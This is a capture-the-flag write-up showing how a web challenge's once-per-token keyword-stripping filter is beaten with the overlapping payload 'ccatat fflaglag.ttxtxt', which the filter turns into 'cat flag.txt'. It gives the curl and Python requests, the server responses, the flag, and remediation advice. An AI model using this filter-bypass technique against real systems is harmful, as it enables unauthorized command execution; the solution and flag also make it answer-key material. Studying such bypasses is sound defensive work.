# Secure Vault v2.0 Jailbreak Write-up

## Challenge

- Target: `https://tachyon.iittp.ac.in/ctf/jailbreak/`
- Goal: bypass the filter and retrieve the flag from the vault

## Summary

The challenge exposes a minimal web UI that sends a user-controlled string to:

```text
POST /ctf/jailbreak/api/challenge
```

The server applies a naive blacklist-based sanitizer that removes these forbidden substrings:

- `print`
- `printf`
- `flag`
- `txt`
- `cat`

The intended command appears to be `cat flag.txt`, but those exact keywords are blocked. The vulnerability is that the blacklist removal is performed naively and only once per forbidden token match, which makes it vulnerable to an overlapping reconstruction trick.

The working payload is:

```text
ccatat fflaglag.ttxtxt
```

After the server strips one occurrence of each forbidden word, the remaining string becomes:

```text
cat flag.txt
```

That grants access and returns the flag:

```text
TACHYON{53rv3rl355_57r1pp3r_m4573r}
```

## Initial Recon

Opening the page source shows a very small client-side app:

```html
<input type="text" id="input" placeholder="Enter payload and press Enter" autofocus>
<!-- <p class="info">Note: System strips forbidden keywords: print, printf, flag, txt, cat.</p> -->
```

When Enter is pressed, the frontend sends JSON like this:

```javascript
const res = await fetch('/ctf/jailbreak/api/challenge', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ payload: val })
});
```

So the real attack surface is the backend endpoint, not the page itself.

## API Behavior

Sending ordinary input returns a denial response:

```json
{"success":false,"stripped":"test","hash_received":"8662743825d7d44af851390c5a869f36f37440b59e1fde916b686676370fdcd1","message":"Hash mismatch. Access Denied."}
```

Sending blocked words shows that the backend removes them from the payload:

### Example: `print`

```json
{"success":false,"stripped":"","hash_received":"ea10497a635cd6ba6d07996c267aba0cc228c9072f1f2b4ccae11fd0217d5644","message":"Hash mismatch. Access Denied."}
```

### Example: `printf`

```json
{"success":false,"stripped":"f","hash_received":"f1e16487fc9404956efd03b32af97db073d0a39f62c92168d458e89b042a7910","message":"Hash mismatch. Access Denied."}
```

This is a very useful clue:

- `printf` becomes `f`
- so the server is not parsing commands safely
- it is simply removing blacklisted substrings from the raw input

That means this is a classic blacklist bypass problem.

## Key Observation

The filter is vulnerable because it removes forbidden substrings from the input, but it does not prevent the final stripped output from containing those same dangerous words again.

This kind of filter can be beaten by embedding a blocked word inside a slightly larger string so that removing one copy reconstructs the blocked word.

### Examples

- `ccatat` -> remove one `cat` -> `cat`
- `fflaglag` -> remove one `flag` -> `flag`
- `.ttxtxt` -> remove one `txt` -> `.txt`

Combining those pieces yields:

```text
ccatat fflaglag.ttxtxt
```

If the filter removes one occurrence each of `cat`, `flag`, and `txt`, the result is:

```text
cat flag.txt
```

That is exactly the command we want the backend to execute or validate.

## Why This Works

Assume the server is doing something conceptually similar to this:

```js
for (const bad of ["print", "printf", "flag", "txt", "cat"]) {
  payload = payload.replace(bad, "");
}
```

This is unsafe because:

1. It relies on a blacklist instead of defining what input is allowed.
2. It transforms the payload rather than rejecting dangerous input.
3. The transformed payload may become dangerous after removal.
4. Overlapping strings can reconstruct blocked tokens.

The payload does not need to contain `cat flag.txt` directly. It only needs to become `cat flag.txt` after the sanitizer finishes its substitutions.

## Exploit Steps

### 1. Inspect the page

Fetch the challenge page:

```bash
curl -L https://tachyon.iittp.ac.in/ctf/jailbreak/
```

That reveals:

- the API path: `/ctf/jailbreak/api/challenge`
- the request format: `{"payload":"..."}`
- the hidden hint listing stripped keywords

### 2. Confirm the blacklist behavior

Send test payloads to see how the backend rewrites input:

```bash
curl -s -X POST https://tachyon.iittp.ac.in/ctf/jailbreak/api/challenge \
  -H "Content-Type: application/json" \
  -d '{"payload":"printf"}'
```

Response:

```json
{"success":false,"stripped":"f","hash_received":"f1e16487fc9404956efd03b32af97db073d0a39f62c92168d458e89b042a7910","message":"Hash mismatch. Access Denied."}
```

That confirms substring stripping.

### 3. Build a self-reconstructing payload

Craft each blocked token so that removing one copy leaves the blocked token behind:

- `cat` -> `ccatat`
- `flag` -> `fflaglag`
- `txt` -> `ttxtxt`

Join them into the intended command:

```text
ccatat fflaglag.ttxtxt
```

### 4. Submit the payload

Using WSL with Python:

```bash
wsl.exe python3 -c "import urllib.request, json; data=json.dumps({'payload':'ccatat fflaglag.ttxtxt'}).encode(); req=urllib.request.Request('https://tachyon.iittp.ac.in/ctf/jailbreak/api/challenge', data=data, headers={'Content-Type':'application/json'}); print(urllib.request.urlopen(req).read().decode())"
```

Response:

```json
{"success":true,"stripped":"cat flag.txt","message":"Access Granted!","flag":"TACHYON{53rv3rl355_57r1pp3r_m4573r}"}
```

## Flag

```text
TACHYON{53rv3rl355_57r1pp3r_m4573r}
```

## Important Technical Notes

### The `hash_received` field was a distraction

The response always included a `hash_received` value on failure, but reversing that value was unnecessary. The practical route was to understand the sanitizer and force the stripped payload to become the desired command.

### Backend stack leakage

Submitting malformed JSON produced an error page that referenced:

```text
/home/ubuntu/jailbreak/api/node_modules/body-parser/...
```

That strongly suggests a Node.js/Express backend using `body-parser`. This was not required for the exploit, but it confirmed the challenge was likely a simple custom web service rather than a hardened execution environment.

This is an inference from the leaked error trace, not a directly provided source listing.

## Root Cause

The vulnerability is unsafe blacklist sanitization.

The server tries to make dangerous input safe by removing certain words. That approach fails because attackers can:

- split dangerous words across larger strings
- rely on overlapping substrings
- make sanitization reconstruct the dangerous command

In other words, the sanitizer is itself the gadget that creates the exploit payload.

## Remediation

If this were a real application, the correct fixes would be:

1. Do not execute user input as commands.
2. Do not rely on blacklist-based string stripping for security.
3. If command execution is unavoidable, use strict allowlists and fixed arguments.
4. Avoid shell invocation entirely; call safe APIs directly.
5. Reject invalid input instead of rewriting it.

## Final Answer

- Payload: `ccatat fflaglag.ttxtxt`
- Result after stripping: `cat flag.txt`
- Flag: `TACHYON{53rv3rl355_57r1pp3r_m4573r}`
